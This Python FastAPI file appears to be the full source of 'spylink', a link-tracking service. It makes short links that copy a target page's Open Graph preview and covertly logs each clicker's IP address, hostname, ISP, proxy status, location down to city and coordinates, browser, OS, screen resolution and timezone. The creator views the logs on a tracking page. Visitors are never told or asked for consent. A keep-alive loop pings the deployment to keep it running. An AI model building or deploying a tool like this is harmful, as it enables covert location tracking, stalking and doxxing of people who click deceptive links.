# main.py

from fastapi import FastAPI, Request, Form, Header, HTTPException
from fastapi.responses import HTMLResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates

import sqlite3
import string
import random
import asyncio
from datetime import datetime
import socket

import httpx
from bs4 import BeautifulSoup
from user_agents import parse as ua_parse  # pip install pyyaml ua-parser user-agents

app = FastAPI()
app.mount("/static", StaticFiles(directory="static"), name="static")
templates = Jinja2Templates(directory="templates")

DB_PATH = "links.db"
SERVICE_URL = "https://spylink-x8w5.onrender.com/"  # ← your deployed URL


def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()

    # ─── links table ─────────────────────────────────────────────────────────
    c.execute("""
    CREATE TABLE IF NOT EXISTS links (
      id INTEGER PRIMARY KEY,
      code TEXT UNIQUE,
      target TEXT,
      email TEXT,
      created_at TEXT,
      og_title TEXT,
      og_description TEXT,
      og_image TEXT,

      capture_ip           INTEGER DEFAULT 0,
      capture_host         INTEGER DEFAULT 0,
      capture_provider     INTEGER DEFAULT 0,
      capture_proxy        INTEGER DEFAULT 0,
      capture_continent    INTEGER DEFAULT 0,
      capture_country      INTEGER DEFAULT 0,
      capture_region       INTEGER DEFAULT 0,
      capture_city         INTEGER DEFAULT 0,
      capture_latlong      INTEGER DEFAULT 0,

      capture_browser      INTEGER DEFAULT 0,
      capture_cookies      INTEGER DEFAULT 0,
      capture_flash        INTEGER DEFAULT 0,
      capture_java         INTEGER DEFAULT 0,
      capture_plugins      INTEGER DEFAULT 0,

      capture_os           INTEGER DEFAULT 0,
      capture_resolution   INTEGER DEFAULT 0,
      capture_localtime    INTEGER DEFAULT 0,
      capture_timezone     INTEGER DEFAULT 0
    )""")

    # ─── visits table ────────────────────────────────────────────────────────
    c.execute("""
    CREATE TABLE IF NOT EXISTS visits (
      id INTEGER PRIMARY KEY,
      link_id INTEGER,
      ip TEXT,
      host TEXT,
      provider TEXT,
      proxy TEXT,
      continent TEXT,
      country TEXT,
      region TEXT,
      city TEXT,
      latlong TEXT,
      browser TEXT,
      cookies_enabled INTEGER,
      flash TEXT,
      java_enabled INTEGER,
      plugins TEXT,
      os TEXT,
      resolution TEXT,
      local_time TEXT,
      time_zone TEXT,
      user_agent TEXT,
      timestamp TEXT
    )""")
    conn.commit()
    conn.close()


@app.on_event("startup")
async def startup():
    init_db()


def generate_code(length: int = 6) -> str:
    alphabet = string.ascii_letters + string.digits
    return ''.join(random.choices(alphabet, k=length))


@app.get("/", response_class=HTMLResponse)
async def read_root(request: Request):
    return templates.TemplateResponse("index.html", {"request": request})


@app.post("/create", response_class=HTMLResponse)
async def create_link(
    request: Request,
    target_url: str = Form(...),
    shortener: str  = Form(...),
    email: str      = Form(...),

    capture_ip: str        = Form(None),
    capture_host: str      = Form(None),
    capture_provider: str  = Form(None),
    capture_proxy: str     = Form(None),
    capture_continent: str = Form(None),
    capture_country: str   = Form(None),
    capture_region: str    = Form(None),
    capture_city: str      = Form(None),
    capture_latlong: str   = Form(None),

    capture_browser: str   = Form(None),
    capture_cookies: str   = Form(None),
    capture_flash: str     = Form(None),
    capture_java: str      = Form(None),
    capture_plugins: str   = Form(None),

    capture_os: str         = Form(None),
    capture_resolution: str = Form(None),
    capture_localtime: str  = Form(None),
    capture_timezone: str   = Form(None)
):
    # 1) generate or accept custom code
    code = generate_code() if shortener == "random" else shortener

    # 2) scrape Open Graph metadata
    og_title = og_description = og_image = ""
    try:
        async with httpx.AsyncClient(timeout=5.0) as client:
            resp = await client.get(target_url)
            soup = BeautifulSoup(resp.text, "html.parser")
            def meta_prop(p):
                tag = soup.find("meta", property=p)
                return tag["content"] if tag and tag.has_attr("content") else ""
            og_title       = meta_prop("og:title")
            og_description = meta_prop("og:description")
            og_image       = meta_prop("og:image")
    except Exception:
        pass

    # 3) collect all flags
    flags = {
      'capture_ip':         bool(capture_ip),
      'capture_host':       bool(capture_host),
      'capture_provider':   bool(capture_provider),
      'capture_proxy':      bool(capture_proxy),
      'capture_continent':  bool(capture_continent),
      'capture_country':    bool(capture_country),
      'capture_region':     bool(capture_region),
      'capture_city':       bool(capture_city),
      'capture_latlong':    bool(capture_latlong),

      'capture_browser':    bool(capture_browser),
      'capture_cookies':    bool(capture_cookies),
      'capture_flash':      bool(capture_flash),
      'capture_java':       bool(capture_java),
      'capture_plugins':    bool(capture_plugins),

      'capture_os':         bool(capture_os),
      'capture_resolution': bool(capture_resolution),
      'capture_localtime':  bool(capture_localtime),
      'capture_timezone':   bool(capture_timezone),
    }

    # 4) insert link + flags
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    created_at = datetime.utcnow().isoformat()

    cols         = ", ".join(flags.keys())
    placeholders = ", ".join("?" for _ in flags)
    vals         = [int(v) for v in flags.values()]

    try:
        c.execute(f"""
          INSERT INTO links
            (code, target, email, created_at, og_title, og_description, og_image, {cols})
          VALUES
            (?, ?, ?, ?, ?, ?, ?, {placeholders})
        """, [code, target_url, email, created_at,
              og_title, og_description, og_image, *vals])
    except sqlite3.IntegrityError:
        # collision; try once more
        code = generate_code()
        c.execute(f"""
          INSERT INTO links
            (code, target, email, created_at, og_title, og_description, og_image, {cols})
          VALUES
            (?, ?, ?, ?, ?, ?, ?, {placeholders})
        """, [code, target_url, email, created_at,
              og_title, og_description, og_image, *vals])

    conn.commit()
    conn.close()

    link_url  = request.url_for("redirect_to_target", code=code)
    track_url = request.url_for("track",            code=code)

    return templates.TemplateResponse(
      "result.html",
      {"request": request, "link_url": link_url, "track_url": track_url}
    )


@app.get("/{code}", response_class=HTMLResponse)
async def redirect_to_target(
    request: Request,
    code: str,
    x_forwarded_for: str | None = Header(None)
):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute(f"""
      SELECT
        id, target, og_title, og_description, og_image,
        capture_ip, capture_host, capture_provider, capture_proxy,
        capture_continent, capture_country, capture_region, capture_city, capture_latlong,
        capture_browser, capture_cookies, capture_flash, capture_java, capture_plugins,
        capture_os, capture_resolution, capture_localtime, capture_timezone
      FROM links WHERE code=?
    """, (code,))
    row = c.fetchone()
    if not row:
        conn.close()
        raise HTTPException(404, "Link not found")

    (
      link_id, target, og_title, og_description, og_image,
      cap_ip, cap_host, cap_provider, cap_proxy,
      cap_continent, cap_country, cap_region, cap_city, cap_latlong,
      cap_browser, cap_cookies, cap_flash, cap_java, cap_plugins,
      cap_os, cap_resolution, cap_localtime, cap_timezone
    ) = row

    # ─── server-side captures ───────────────────────────────────────────────
    if x_forwarded_for:
        ip = x_forwarded_for.split(",")[0].strip()
    else:
        ip = request.client.host or ""

    ua_string = request.headers.get("user-agent", "")
    ua = ua_parse(ua_string)

    host = ""
    if cap_host:
        try:
            host = socket.gethostbyaddr(ip)[0]
        except Exception:
            host = ""

    country = region = city = continent = provider = proxy = latlong = ""
    need_geo = any([cap_provider, cap_proxy, cap_continent,
                    cap_country, cap_region, cap_city, cap_latlong])
    if need_geo and ip:
        async with httpx.AsyncClient(timeout=5.0) as client:
            try:
                r = await client.get(f"https://ipapi.co/{ip}/json")
                data = r.json()
                if r.status_code != 200 or data.get("error"):
                    raise ValueError("ipapi error")
            except Exception:
                r2 = await client.get(
                  f"http://ip-api.com/json/{ip}"
                  "?fields=status,message,country,regionName,city,continent,org,proxy,lat,lon"
                )
                data = r2.json() if r2.status_code == 200 else {}
            if cap_provider:   provider  = data.get("org","") or ""
            if cap_proxy:      proxy     = str(data.get("proxy","")) or ""
            if cap_continent:  continent = data.get("continent","") or ""
            if cap_country:    country   = data.get("country_name","") or data.get("country","") or ""
            if cap_region:     region    = data.get("region","") or data.get("regionName","") or ""
            if cap_city:       city      = data.get("city","") or ""
            if cap_latlong:
                lat = data.get("latitude") or data.get("lat")
                lon = data.get("longitude") or data.get("lon")
                latlong = f"{lat},{lon}" if lat and lon else ""

    cookies_enabled = 1 if cap_cookies and "cookie" in request.headers else 0

    browser = ""
    if cap_browser:
        fam = ua.browser.family
        ver = ".".join(str(x) for x in ua.browser.version)
        browser = f"{fam} {ver}".strip()

    os_str = ""
    if cap_os:
        fam = ua.os.family
        ver = ".".join(str(x) for x in ua.os.version)
        os_str = f"{fam} {ver}".strip()

    # placeholder client-only bits
    flash_v    = ""
    java_e     = 0
    plugins    = ""
    resolution = ""
    local_time = ""
    time_zone  = ""

    timestamp = datetime.utcnow().isoformat()
    c.execute("""
      INSERT INTO visits
        (link_id, ip, host, provider, proxy, continent, country, region, city, latlong,
         browser, cookies_enabled, flash, java_enabled, plugins,
         os, resolution, local_time, time_zone, user_agent, timestamp)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    """, (
      link_id, ip, host, provider, proxy, continent, country, region, city, latlong,
      browser, cookies_enabled, flash_v, java_e, plugins,
      os_str, resolution, local_time, time_zone, ua_string, timestamp
    ))
    conn.commit()
    conn.close()

    return templates.TemplateResponse("redirect.html", {
      "request": request,
      "target":          target,
      "og_title":        og_title,
      "og_description":  og_description,
      "og_image":        og_image,

      "capture_flash":      cap_flash,
      "capture_java":       cap_java,
      "capture_plugins":    cap_plugins,
      "capture_resolution": cap_resolution,
      "capture_localtime":  cap_localtime,
      "capture_timezone":   cap_timezone,

      "code": code
    })


@app.post("/collect")
async def collect_data(request: Request):
    data = await request.json()
    code = data.get("code")
    if not code:
        raise HTTPException(400, "Missing code")

    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()

    c.execute("SELECT id FROM links WHERE code=?", (code,))
    row = c.fetchone()
    if not row:
        conn.close()
        raise HTTPException(404, "Link not found")
    link_id = row[0]

    c.execute("SELECT MAX(id) FROM visits WHERE link_id=?", (link_id,))
    visit_id = c.fetchone()[0]

    updates = []
    params  = []
    for field in ("resolution", "local_time", "time_zone", "flash", "java_enabled", "plugins"):
        if field in data:
            updates.append(f"{field}=?")
            params.append(data[field])
    if updates and visit_id:
        sql = f"UPDATE visits SET {', '.join(updates)} WHERE id=?"
        c.execute(sql, (*params, visit_id))
        conn.commit()

    conn.close()
    return {"status": "ok"}


@app.get("/track/{code}", response_class=HTMLResponse)
async def track(request: Request, code: str):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT id FROM links WHERE code=?", (code,))
    row = c.fetchone()
    if not row:
        conn.close()
        raise HTTPException(404, "Link not found")
    link_id = row[0]

    # only select the six fields your template expects
    c.execute("""
      SELECT ip, user_agent, country, region, city, timestamp
      FROM visits
      WHERE link_id=?
      ORDER BY timestamp DESC
    """, (link_id,))
    visits = c.fetchall()
    conn.close()

    return templates.TemplateResponse(
      "track.html",
      {"request": request, "code": code, "visits": visits}
    )


@app.get("/ping")
async def ping():
    return {"status": "alive"}


@app.on_event("startup")
async def schedule_ping_task():
    async def ping_loop():
        async with httpx.AsyncClient(timeout=5.0) as client:
            while True:
                try:
                    r = await client.get(f"{SERVICE_URL}/ping")
                    if r.status_code != 200:
                        print(f"[Ping] returned {r.status_code}")
                except Exception as e:
                    print(f"[PingError] {e!r}")
                await asyncio.sleep(10)
    asyncio.create_task(ping_loop())
